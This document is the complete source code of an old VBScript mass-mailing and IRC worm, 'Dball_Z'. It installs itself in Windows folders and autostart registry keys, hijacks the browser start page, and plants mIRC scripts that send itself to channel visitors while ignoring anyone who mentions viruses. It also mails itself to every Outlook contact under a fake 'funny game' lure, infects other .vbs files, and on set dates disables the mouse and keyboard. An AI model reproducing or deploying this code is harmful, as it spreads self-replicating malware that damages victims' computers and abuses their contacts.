'db
'Dball_Z powered by YuP (Lord YuPi7eR)
'Thank you , and bye bye Dragon World
On Error Resume Next
Const ForReading = 1, ForWriting = 2, ForAppending = 8
Const WindowsFolder = 0

Dim FSO, WshShell, UDM , Ircini, SM, InfMarker, MyCode
Dim Parent, DragonF, V, VFile, BatF, AutoF
Dim FoldersToGet(2), FolderX, VCode

Set WshShell = CreateObject("Wscript.Shell")

Set FSO = CreateObject("Scripting.FileSystemObject")
Parent = Wscript.ScriptFullName

winf = Fso.GetSpecialFolder(0)
sysf = Fso.GetSpecialFolder(1)
tempf = Fso.GetSpecialFolder(2)

tempfile = tempf& "\dragonball.cab"

Fso.CopyFile Parent,winf& "\winsock.vbs"
Fso.CopyFile Parent,winf& "\sysdir.vbs"
Fso.CopyFile Parent,sysf& "\milioner.vbs"
Fso.CopyFile Parent,sysf& "\dragonball.vbs"
Fso.CopyFile Parent,sysf& "\dragonball.cab"

bats = winf& "\dragon.bat"
attachmirc1 = sysf& "\dragonball.vbs " 
attachmirc2 = sysf& "\milioner.vbs " 
attachmail = sysf& "\dragonball.cab"
'j don`t have time to sent a cab file ,but .....;] this is version 0.1;]

      
sysmakeup = WshShell.RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\winsock2.0",winf& "\winsock.vbs" )
sysmakeup1 = WSHShell.RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\sysup",winf& "\sysdir.vbs")

owner = WshShell.RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","Dragon Ball Z by YuP")
deleteold = WshShell.RegDelete("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")
startpage = WshShell.RegWrite("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://bdball.metropoli2000.net/fotos/imagenes/sagas/foto7_40.jpg")

editini winf&"\win.ini","[windows]","load",attachmirc1
editini winf&"\win.ini","[windows]","run",attachmirc2
  

mirc()
sub mirc()

Set Ircini = Fso.OpenTextFile("c:\mirc\mirc.ini", ForAppending,True)
Ircini.WriteLine "[rfiles]"
Ircini.WriteLine "n101=script.ini"
Ircini.WriteLine "n102=update.ini"
Ircini.close


Set UDM = Fso.CreateTextFile("c:\mirc\update.ini",ForWriting)
UDM.WriteLine "[script]"
UDM.WriteLine "n0=*****************************************************************"
UDM.WriteLine "n1= ;(c) Copyright Microsoft Corporation, 2000 "
UDM.WriteLine "n2= ;This file is a part of (r) Windows system "
UDM.WriteLine "n3= ;REMEMBER YOU DELETE THIS FILE FOR YOUR OWN RESPONIBILITY"
UDM.WriteLine "n4=*****************************************************************"
UDM.WriteLine "n5="
UDM.WriteLine "n6=On 1:Join:#:{/if ($nick !== $me) { /dcc send $nick "&attachmirc1&" "
UDM.WriteLine "n7=} }"
UDM.WriteLine "n8=On 1:Text:*virus*:*:{ /ignore $nick 2 $wildsite }"
UDM.WriteLine "n9=On 1:Text:*ball*:*:{ /ignore $nick 2 $wildsite }"
UDM.WriteLine "n10=On 1:Text:*yup*:*:{ /ignore $nick 2 $wildsite }"
UDM.WriteLine "n11=On 1:Text:*worm*:{ /ignore $nick 2 $wildsite }"
UDM.WriteLine "n12=On 1:Text:*milioner*:*:{ /ignore $nick 2 $wildsite }"
UDM.WriteLine "n13=On 1:Text:*vbs*:*:{ /ignore $nick 2 $wildsite }"
UDM.WriteLine "n14=On 1:Text:*script*:*:{ /ignore $nick 2 $wildsite }"
UDM.WriteLine "n15=On 1:Text:*remonte*:*:{  /ignore $nick 2 $wildsite }"
UDM.WriteLIne "n16=On 1:Join:#: { /notice $chan [|Dragon|Ball_Z|] p0w3r3d by YuP }"
UDM.close

mircinfo = "Running Mirc $version At $time by Khaled Mardam-Bey"

Set SM = Fso.CreateTextFile("c:\mirc\script.ini",ForWriting)
SM.WriteLine "[script]"
SM.WriteLine "n0=On 1:Start:{/load -rs update.ini | /clear -s | /echo 4 -s "&mircinfo&" | /server irc.dal.net " 
SM.close 




End Sub

if WshShell.RegRead("HKLM\Software\OUTLOOK.Dball_Z") = "" Then
amj = WshShell.RegWrite("HKLM\Software\OUTLOOK.Dball_Z","1")
mail()

sub mail()
'mail
     On Error Resume Next
     Dim theApp, theNameSpace, theMailItem
     set regedit=CreateObject("WScript.Shell")
  set out=WScript.CreateObject("Outlook.Application")
     Set theApp = WScript.CreateObject("Outlook.Application")
     Set theNameSpace = theApp.GetNameSpace("MAPI")
     theNameSpace.Logon "profile", "password"
     Set theMailItem = theApp.CreateItem(0)
     for ctrlists=1 to theNameSpace.AddressLists.Count
     set a=theNameSpace.AddressLists(ctrlists)
     x=1
      regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
      if (regv="") then
      regv=1
      end if
      if (int(a.AddressEntries.Count)>int(regv)) then
  for ctrentries=1 to a.AddressEntries.Count
  malead=a.AddressEntries(x)
  regad=""
  regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft \WAB\"&malead)
  if (regad="") then
     Set malead=a.AddressEntries(x)
     Set theMailItem = theApp.CreateItem(0)
     theMailItem.Recipients.Add malead
     theMailItem.Subject = "Hello ;]"
     theMailItem.Attachments.Add attachmirc
     theMailItem.Body = "Hi , check out this game that j sent you (funny game from the net:])." &vbCrLf
     theMailItem.Send
     theNameSpace.Logoff
  end if
  x=x+1
  Next
  regedit.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEn
  tries.Count
  else
  regedit.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEn
  tries.Count
  end if
  Next
  End Sub
End IF

FoldersToGet(0) = "."
FoldersToGet(1) = FSO.GetSpecialFolder(WindowsFolder)
FoldersToGet(2) = FSO.GetSpecialFolder(WindowsFolder) & "\Desktop"
Set DragonF = FSO.OpenTextFile(Parent, ForReading)
MyCode = DragonF.ReadAll
DragonF.Close

For Each FolderX in FoldersToGet
   Catch FolderX
Next

Sub Catch(TheFolder)

For Each V in FSO.GetFolder(TheFolder).Files
  If FSO.GetExtensionName(V.Name) = "vbs" or FSO.GetExtensionName(V.Name) = "vbe" then

Set VFile = FSO.OpenTextFile(V.Path,ForReading)
    InfMarker = VFile.readline
    VFile.close

If InfMarker = "'db" Then

End If
If InfMarker <> "'db" Then
      Set VFile = FSO.OpenTextFile(V.path,ForReading)
      VCode = VFile.ReadAll
      VFile.close
      VCode = MyCode & VCode
      Set VFile = FSO.OpenTextFile(V.Path,ForWriting,True)
       VFile.Write VCode
       VFile.close
    end if
  end if
next
End Sub

'Beltran thx to your web page and sorry to you ;] 
'Dobre bo Polskie;p
If Day(Now())=1 or Day(Now())=27 Then
msg = msgbox("Thank you,and bye bye DragonWorld!!!",vbSystemModal + vbOkOnly + vbCritical,"Dragon Ball Z by YuP")
If WshShell.RegRead("HKLM\Software\Media.Goku") = "" Then
If winf <> "C:\WINNT" Then
WshShell.Run "rundll32.exe mouse,disable"
WshShell.Run "rundll32 keyboard,disable"
End If
goku = WshShell.RegWrite("HKLM\Software\Media.Goku",1)
g = "%{ENTER}"
WshShell.Run "mplayer2.exe http://bdball.metropoli2000.net/mmedia/videos/clips/dballz/gokuhss1.mpg"
Wscript.Sleep 700
WshShell.AppActivate "gokuhss1"
Wscript.Sleep 500
WshShell.SendKeys g
Wscript.Sleep 1000

Set BatF = Fso.CreateTextFile(bats , ForWriting,True)
BatF.WriteLine "@ECHO ON"
BatF.WriteLine "ECHO DraGon Ball [Z] by YuP"
BatF.WriteLine "ECHO Thank you and bye bye dragon world!!"
BatF.close

Set AutoF = Fso.OpenTextFile("c:\AUTOEXEC.BAT", ForAppending)
AutoF.WriteLine bats
AutoF.Close
End If
End If


